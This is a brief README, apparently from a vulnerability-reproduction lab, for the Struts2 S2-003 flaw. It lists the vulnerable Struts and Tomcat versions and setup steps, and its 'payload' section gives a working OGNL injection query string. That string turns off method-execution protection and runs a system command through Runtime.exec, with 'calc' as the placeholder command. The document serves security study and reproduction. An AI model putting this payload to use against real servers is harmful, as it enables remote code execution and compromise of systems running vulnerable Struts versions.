## Struts2 S2-003

### Environment

Struts2 Version: `struts-2.0.11.2-all`

Tomcat: `6.0.9 (I only run payload behind successful in this version).`

IDE: idea 2020.1.1

Open the project with idea, and readd all the jars at web/WEB_INF/lib.

![{86B8007A-5296-441A-9637-0A5AFBDF7FE6}_20200619163625]({86B8007A-5296-441A-9637-0A5AFBDF7FE6}_20200619163625.jpg)

### POC

![{15189529-560B-45EC-9D26-EA6CEA8D80CC}_20200619162417]({15189529-560B-45EC-9D26-EA6CEA8D80CC}_20200619162417.jpg)

### payload

`?('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse')(bla)(bla)&('\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\'calc\')')(bla)(bla)`

### Reference

- [【Struts2-命令-代码执行漏洞分析系列】S2-003和S3-005](https://xz.aliyun.com/t/2323)

- [S2-005 远程代码执行漏洞](https://github.com/vulhub/vulhub/blob/master/struts2/s2-005/README.zh-cn.md)
